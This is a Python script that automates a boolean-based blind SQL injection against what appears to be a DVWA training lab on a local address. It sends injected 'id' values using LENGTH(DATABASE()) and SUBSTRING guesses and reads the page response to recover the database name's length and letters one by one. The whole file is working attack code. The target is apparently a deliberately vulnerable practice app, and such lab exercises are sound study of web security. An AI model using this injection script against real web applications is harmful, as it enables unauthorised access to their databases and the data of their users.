import requests
import string
from bs4 import BeautifulSoup

requests.packages.urllib3.disable_warnings()

base_url = "192.168.1.7"
url = f"http://{base_url}/001/vulnerabilities/sqli_blind/"
cookies = {
        "PHPSESSID": "3679434a7409db724ad645596f20bc41",
        "security": "low"
}

query_1 = "1' AND LENGTH(DATABASE()) = {} #"
query_2 = "1' AND SUBSTRING(DATABASE(), {}, 1) = '{}' #"

def get_response(url, query, *args):
        payload = {
                "id": query.format(*args),
                "Submit": "Submit#"
        }
        response = requests.get(url, params=payload, cookies=cookies, verify=False)
        soup = BeautifulSoup(response.text, "html.parser")
        return bool(soup.findAll(string="User ID exists in the database."))

#check for db length
db_length = 0;
for x in range(5):
        if get_response(url, query_1, x):
                print(f"DB's Length = {x}")
                db_length = x

#get db name
db_name = []
for x in range(1, db_length+1):
	for c in string.ascii_lowercase:
		if get_response(url, query_2, x, c):
			db_name.append(c)
			break

db_name = "".join(db_name)
print(f"DB's Name = {db_name}")
